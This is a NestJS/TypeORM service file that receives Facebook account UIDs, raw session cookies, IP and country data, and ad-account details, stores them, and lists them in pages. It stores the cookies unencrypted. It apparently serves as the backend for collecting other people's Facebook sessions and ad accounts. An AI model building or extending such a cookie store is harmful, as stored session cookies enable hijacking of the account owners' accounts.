import { Repository } from 'typeorm';
import { Injectable } from '@nestjs/common';
import { IPEntity } from 'src/entitys/ips.entity';
import { InjectRepository } from '@nestjs/typeorm';
import { cookAdInfoData } from './common/adinfo.helper';
import { AdInfoEntity } from 'src/entitys/adInfo.entity';
import { FbAccountEntity } from 'src/entitys/fbAccount.entity';

@Injectable()
export class AdinfoService {
    constructor(
        @InjectRepository(IPEntity) private ipRepo: Repository<IPEntity>,
        @InjectRepository(AdInfoEntity) private adInfoRepo: Repository<AdInfoEntity>,
        @InjectRepository(FbAccountEntity) private fbAccountRepo: Repository<FbAccountEntity>,
    ) { }

    async getAdInfoByFbUid(fbUid: string) {
        const listAdInfos = await this.adInfoRepo.find({ where: { fbAccount: { fbUid: fbUid } } })
        return listAdInfos;
    }

    async createAdInfo(adInfo: any) {
        const { uid, data } = adInfo;
        const newAdAccounts = cookAdInfoData(data);
        const fbAccount = await this.fbAccountRepo.findOneBy({ fbUid: uid });

        if (fbAccount) {
            const adAccounts = this.adInfoRepo.create(newAdAccounts);
            adAccounts.forEach(ads => ads.fbAccount = fbAccount);
            const result = await this.adInfoRepo.save(adAccounts);
            return result;
        }

        return;
    }

    async getAllFbAccount(take = 10, skip = 0) {
        const [result, total] = await this.fbAccountRepo.findAndCount({
            take,
            skip,
            order: { updatedAt: 'DESC' },
        });

        return { data: result, total: total };
    }

    async createFbAccount(data: any) {
        const { ipInfo, uid, cookies } = data;
        let fbAccount = await this.fbAccountRepo.findOneBy({ fbUid: uid });
        if (!fbAccount) fbAccount = new FbAccountEntity();

        fbAccount.note = '';
        fbAccount.fbUid = uid;
        fbAccount.countryName = ipInfo?.country || 'None';
        fbAccount.cookieData = JSON.stringify(cookies) || '';
        fbAccount.ipAddress = ipInfo?.ip || Math.random().toString(36).slice(2, 10);

        return this.fbAccountRepo.save(fbAccount);
    }
}
